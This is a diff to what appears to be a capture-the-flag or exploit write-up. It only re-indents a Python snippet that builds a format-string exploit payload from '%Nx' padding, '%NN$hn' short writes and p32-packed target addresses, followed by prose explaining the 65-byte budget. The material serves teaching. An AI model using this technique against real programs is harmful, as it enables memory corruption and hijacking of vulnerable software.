@@ -213,17 +213,17 @@ This array is sorted by the index so that the next emit character count is great
 ```python
 n=0; q=19; c=0; payload = b''
 for i in sorted(words):
-	payload += b'%' + str(i-n).encode() + b'x'
-	payload += b'%' + str(q).rjust(2,'0').encode() + b'$hn'
-	c += len(str(i-n)) + 2
-	n += (i-n)
-	q += 1
+    payload += b'%' + str(i-n).encode() + b'x'
+    payload += b'%' + str(q).rjust(2,'0').encode() + b'$hn'
+    c += len(str(i-n)) + 2
+    n += (i-n)
+    q += 1
 
 assert(c <= 25)
 payload += b' '*(25-c)
 
 for i in sorted(words):
-	payload += p32(words[i])
+    payload += p32(words[i])
 ```	
 
 From the _Analysis_ section we determined there can only be a max of 65 characters used.  From that subtract off 16 for the 4 8-byte addresses at the end.  That leaves 49.  There are 4 `%XX$hn` conversion specifiers taking up a total of 24 bytes, leaving 25 bytes to specify the `%YYYYx` conversions to emit `YYYY` number of spaces.  The `assert` above will check that we didn't blow out our budget, and the following append to the `payload` fills in spaces so that all the addresses following that are aligned on the stack.
